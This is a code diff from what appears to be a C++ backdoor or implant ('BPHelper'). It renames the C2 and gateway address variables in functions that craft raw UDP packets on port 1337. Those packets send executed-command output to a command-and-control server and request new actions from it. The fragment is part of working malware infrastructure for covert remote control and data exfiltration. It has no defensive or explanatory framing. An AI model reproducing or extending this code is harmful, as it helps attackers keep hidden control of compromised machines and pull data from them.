@@ -52,17 +52,17 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
 #ifdef __unix__
             // Sending the command output to the C2
             std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
-                                                 C2IP,
-                                                 1337,
-                                                 1337,
-                                                 payload,
-                                                 rawSocket.getMac(),
-                                                 nextHopMac);
+                                                      c2Ip,
+                                                      1337,
+                                                      1337,
+                                                      payload,
+                                                      rawSocket.getMac(),
+                                                      nextHopMac);
 
 #else
             // Sending the command output to the C2
             std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
-                C2IP,
+                c2Ip,
                 1337,
                 1337,
                 payload);
@@ -105,33 +105,33 @@ void BPHelper::requestAction() {
 
 #if defined(_WIN32) || defined(WIN32)
     std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
-                                            C2IP,
+                                            c2Ip,
                                             1337,
                                             1337,
                                             payload);
     rawSocket.send(req);
 #else
     std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
-                                         C2IP,
-                                         1337,
-                                         1337,
-                                         payload,
-                                         rawSocket.getMac(),
-                                         nextHopMac);
+                                              c2Ip,
+                                              1337,
+                                              1337,
+                                              payload,
+                                              rawSocket.getMac(),
+                                              nextHopMac);
     rawSocket.send(req);
 #endif
 }
 
 BPHelper::BPHelper() {
 #ifdef __unix__
-    rawSocket = RawSocket(C2IP);
+    rawSocket = RawSocket(c2Ip);
     if (useGateway) {
-        nextHopMac = rawSocket.getMacOfIP(ntohl(GatewayIP));
+        nextHopMac = rawSocket.getMacOfIP(ntohl(gatewayIp));
     } else {
-        nextHopMac = rawSocket.getMacOfIP(ntohl(C2IP));
+        nextHopMac = rawSocket.getMacOfIP(ntohl(c2Ip));
     }
 #elif defined(_WIN32) || defined(WIN32)
-    rawSocket = RawSocket(C2IP);
+    rawSocket = RawSocket(c2Ip);
 #endif
     currentCmd = 0;
 }
